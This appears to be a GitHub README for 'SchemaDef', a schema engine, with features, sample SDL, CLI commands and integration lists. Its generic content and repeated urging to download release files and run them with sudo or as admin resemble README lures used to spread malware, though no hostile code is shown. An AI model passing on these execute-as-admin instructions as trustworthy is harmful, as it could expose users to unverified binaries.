SchemaDef — Scalable Schema Engine for Modern Data Platforms
===========================================================

[![Download Release](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/WFWDWD/SchemaDef/releases)

![Schema diagram](https://images.unsplash.com/photo-1526378720577-62f24b5b5d6d?auto=format&fit=crop&w=1400&q=80)

What this repo contains
-----------------------

SchemaDef is a professional schema definition engine and runtime.  
It provides a schemadef-engine, SchemaDef-optimized scalable architecture, and enterprise design capabilities for data platforms, APIs, and event pipelines.

SchemaDef focuses on:

- Declarative schema-first workflows
- Cross-format schema generation (JSON Schema, Avro, Protobuf, SQL DDL)
- Migration plans and safe rollout
- Runtime schema validation and transformation
- Integrations with ORMs, message brokers, and schema registries

Quick links
-----------

- Releases (download and run the release file): https://github.com/WFWDWD/SchemaDef/releases
- Downloads: use the Releases page above to fetch the package for your platform.

Badges
------

[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/WFWDWD/SchemaDef/actions)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue)](LICENSE)
[![Releases](https://img.shields.io/badge/releases-latest-orange)](https://github.com/WFWDWD/SchemaDef/releases)

Table of contents
-----------------

- Features
- Concepts and jargon
- Architecture overview
- Quick start
- CLI and runtime
- Schema definition language (SDL)
- Examples
- Integration points
- Deployment patterns
- Testing and validation
- Contributing
- Support and contact
- License

Features
--------

- Schema-first design. Write schemas once and generate artifacts for all targets.
- Multi-format generators. Emit JSON Schema, Protobuf, Avro, SQL DDL, and OpenAPI.
- Versioned migrations. Produce migration plans and safe apply strategies.
- Runtime validation. Validate and transform messages in the runtime pipeline.
- Optimized storage. Support sharded and partitioned schema stores.
- Policy engine. Enforce schema governance via rules and hooks.
- Extensible. Plugin system for custom generators, validators, and transports.
- Observability. Metrics and tracing for schema operations and validations.

Concepts and jargon
-------------------

- SDL: Schema Definition Language used by SchemaDef. It describes types, relations, and constraints.
- DDL: Data Definition Language, the SQL artifacts emitted from an SDL.
- Registry: Central store for schemas and versions.
- Migration plan: Ordered steps to move from one schema version to another.
- Validation pipeline: Runtime flow where records pass through schema checks and transforms.
- Codec: A serializer/deserializer for a target format (JSON, Avro, Protobuf).
- Adapter: Integration component for databases, message brokers, or services.

Architecture overview
---------------------

![Architecture diagram](https://raw.githubusercontent.com/github/explore/main/topics/architecture/architecture.png)

SchemaDef follows a modular, scalable architecture:

- CLI / UI: Author and manage SDL files.
- Compiler: Parse SDL and generate artifacts.
- Registry / Store: Versioned storage for schemas and releases.
- Orchestrator: Compute migration plans and rollout strategies.
- Runtime: Lightweight validators that plug into pipelines.
- Adapter layer: Connectors to Kafka, Pulsar, Postgres, MySQL, and REST APIs.
- Observability: Metrics, logs, and traces for schema operations.

Each module scales horizontally. The registry uses partitioning and hot caching. The runtime runs as sidecars or embedded libraries when low latency matters.

Quick start
-----------

1. Download the release package from releases and execute the installer or binary.  
   Visit: https://github.com/WFWDWD/SchemaDef/releases

2. Example for Linux x86_64 (replace asset name with the one you download):

```
curl -L -o schemadef.tar.gz "https://github.com/WFWDWD/SchemaDef/releases/download/v1.0.0/SchemaDef-linux-x86_64.tar.gz"
tar -xzf schemadef.tar.gz
sudo ./schemadef install
```

3. Initialize a project:

```
schemadef init my-schema-project
cd my-schema-project
schemadef compile
schemadef run
```

If you use Docker:

```
docker pull wfwdwd/schemadef:latest
docker run --rm -p 8080:8080 wfwdwd/schemadef:latest
```

CLI and runtime
---------------

The CLI is the primary tool for authoring, compiling, and testing SDL.

Common commands:

- schemadef init <name> — create project scaffold
- schemadef validate <file> — validate SDL
- schemadef compile — generate artifacts
- schemadef up — run local runtime
- schemadef publish — push schema to registry
- schemadef migrate plan — create migration plan
- schemadef migrate apply — apply migration to target

The runtime exposes a small SDK for validations. Use the SDK to embed SchemaDef checks in services or to run as a sidecar for broker consumers.

Schema Definition Language (SDL)
-------------------------------

SDL mixes types, fields, relations, and metadata. It targets clarity and easy generation.

Sample SDL:

```
type User {
  id: uuid [primary]
  name: string [index]
  email: string [unique]
  createdAt: datetime [default: now()]
}

type Order {
  id: uuid [primary]
  userId: uuid [fk: User.id]
  amount: decimal
  currency: string [size:3]
  status: enum { PENDING, PAID, CANCELLED }
}
```

From this SDL, SchemaDef can generate:

- JSON Schema for API validation
- Avro/Protobuf for event messages
- SQL DDL for relational store
- Migration plan between versions

Generation targets
------------------

- JSON Schema: field types, constraints, pattern checks.
- Avro:Schemas for streaming.
- Protobuf: compact binary messages with versioning guidelines.
- SQL: CREATE TABLE, ALTER TABLE, indexes, constraints.
- OpenAPI: API contract that matches schemas.

Examples
--------

Example projects live under /examples. Each example contains:

- SDL files
- Build scripts
- CI configuration
- Docker Compose for local testing

Example: event-driven order flow

1. Compile Avro and Protobuf artifacts from SDL.
2. Publish schema to internal registry.
3. Start consumer with runtime validator.
4. Produce messages to Kafka topic.

Code sample (JavaScript runtime):

```
const { SchemaRuntime } = require('schemadef-runtime');

const runtime = new SchemaRuntime({ registryUrl: 'http://localhost:8080' });
await runtime.load('orders', 'v1');

const result = runtime.validate('orders', payload);
if (!result.valid) {
  throw new Error('Invalid message: ' + JSON.stringify(result.errors));
}

const transformed = runtime.transform('orders', payload, { format: 'avro' });
await producer.send({ topic: 'orders', value: transformed });
```

Integration points
------------------

Adapters and integrations include:

- Kafka, Pulsar, RabbitMQ
- Postgres, MySQL, CockroachDB
- MongoDB, DynamoDB
- REST proxies and API gateways
- Schema registries (Confluent, Apicurio)
- ORMs (TypeORM, Sequelize, Hibernate)
- CI/CD systems for schema gating

Deployment patterns
-------------------

- Local dev: Run schemadef up or Docker Compose.
- CI gate: Run schemadef validate and schemadef migrate plan in CI.
- Canary rollout: Orchestrator computes migration paths and sends staged changes.
- Sidecar runtime: Run validators next to consumers for low latency.
- Central registry: Host schema store behind auth and RBAC.

Security and governance
-----------------------

- RBAC for publishing and approving schemas
- Policy engine to enforce rules (no breaking changes without approval)
- Signing of release artifacts for tamper-proof deployment
- Audit logs of schema changes and migrations

Testing and validation
----------------------

- Unit tests for SDL rules
- Contract tests using generated artifacts
- Property tests for migration plans
- CI hooks to block breaking changes

Observability
-------------

- Metrics: request rate, validation latency, compile time
- Tracing: end-to-end traces for migrations and validations
- Logs: structured logs for operations and errors

Advanced topics
---------------

- Multi-schema composition: Compose types from multiple repos.
- Sharded registries: Partition registry by team or domain.
- Cross-format compatibility: Maintain field mappings across JSON/Avro/SQL.
- Event sourcing hooks: Derive snapshots and schema-aware replays.

Contributing
------------

- Fork the repo.
- Create a feature branch.
- Run tests locally: schemadef test
- Open a pull request with a clear description and tests.

Code style
- Follow the lint rules in .editorconfig and .eslintrc.
- Keep SDL files small and well documented.

Release and downloads
---------------------

Get the release file from the Releases page. The release page contains platform-specific assets and installers that you must download and execute. Use the Releases link to find the correct asset, then run the installer or binary per platform instructions:

https://github.com/WFWDWD/SchemaDef/releases

For example:

- Windows: download SchemaDef-windows.exe and run as admin.
- macOS: download SchemaDef-macos.dmg and mount then run.
- Linux: download the tar.gz or deb/rpm and install.

If a direct asset URL appears on the Releases page, use that file and execute it to install SchemaDef.

Support and contact
-------------------

- Submit issues for bugs or feature requests.
- Open PRs for fixes and improvements.
- For enterprise support, add an issue labeled support and include your environment details.

Roadmap
-------

Planned items:

- First-class GraphQL code generation
- Incremental compile and fast watch mode
- Built-in schema diff visualizer
- More adapters for cloud messaging services

References and further reading
------------------------------

- JSON Schema: https://json-schema.org/
- Avro: https://avro.apache.org/
- Protobuf: https://developers.google.com/protocol-buffers
- Schema registry patterns and best practices

Files and layout
----------------

A typical repo layout:

- /cmd — CLI sources
- /compiler — SDL parser and generators
- /runtime — validator SDKs and sidecar code
- /adapters — connectors for brokers and DBs
- /examples — sample projects
- /docs — extended documentation and RFCs

License
-------

This project uses the Apache 2.0 license. See LICENSE for details.